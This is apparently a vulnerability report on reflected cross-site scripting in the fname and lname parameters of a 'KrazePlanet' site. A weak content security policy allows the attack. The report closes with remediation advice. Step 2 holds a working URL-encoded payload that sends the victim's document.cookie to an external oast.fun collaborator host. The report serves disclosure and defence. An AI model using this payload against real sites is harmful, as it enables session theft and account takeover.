## Title

Reflected Cross-Site Scripting (XSS) Leading to Account Takeover via Unsanitized `fname` and `lname` Parameters on KrazePlanet Platform.

## Affected URL

https://space.pwnedbox.site/

## Description

A Reflected Cross-Site Scripting (XSS) vulnerability combined with a permissive Content Security Policy (CSP) allowing `'unsafe-inline'` was identified in the input handling of the KrazePlanet platform. User-supplied input passed through the `fname` and `lname` GET parameters is echoed directly into the Document Object Model (DOM) without proper sanitization, encoding, or output escaping.

Because the active CSP configuration permits inline scripts and external data exfiltration vectors, an attacker can construct a malicious link incorporating JavaScript payloads (such as cookie exfiltration via `fetch()` or `document.write()`). When an authenticated user opens the crafted URL, the script executes within their active session context, enabling session token theft, account compromise, and full account takeover.

## Steps to Reproduce

1. Navigate to the target application: `https://space.pwnedbox.site/`.
2. Craft a malicious URL injecting an exfiltration payload into the `fname` parameter, such as: `https://space.pwnedbox.site/?fname=%27%3E%3Cscript%3Edocument.write%28%27%3Cimg%20src%3Dhttp%3A%2F%2Fpsdqfmrbfpsifmkwjckdw8hzpv8sna9mv.oast.fun%2F%3Fc%3D%27%2Bdocument.cookie%2B%27%3E%27%29%3C%2script%3E`.
3. Send or trick an authenticated user into visiting the crafted URL.
4. Observe that the payload executes in the victim's browser, exfiltrating sensitive session cookies to the external collaborator endpoint (`oast.fun`) and allowing account takeover.

## POC

<img width="1815" height="1231" alt="image" src="https://github.com/user-attachments/assets/1b5d75ea-7483-4eee-9acc-b0fe0443f6d9" />


## Impact

1. Full account takeover via session cookie exfiltration or unauthorized actions performed on behalf of the authenticated user.
2. Execution of arbitrary JavaScript code within the context of any victim visiting the crafted malicious URL.
3. Exploitation of weak Content Security Policy headers (`'unsafe-inline'`) to facilitate data theft.

## Remediation

1. Implement strict context-aware output encoding (such as HTML entity encoding) for all reflected user input rendered within the page body.
2. Harden the Content Security Policy (CSP) by removing `'unsafe-inline'`, disallowing unsafe wildcard image sources, and enforcing strict script nonce or hash policies.
3. Avoid direct reflection of raw GET parameters (`$_GET`) into the output stream without prior validation and sanitization.
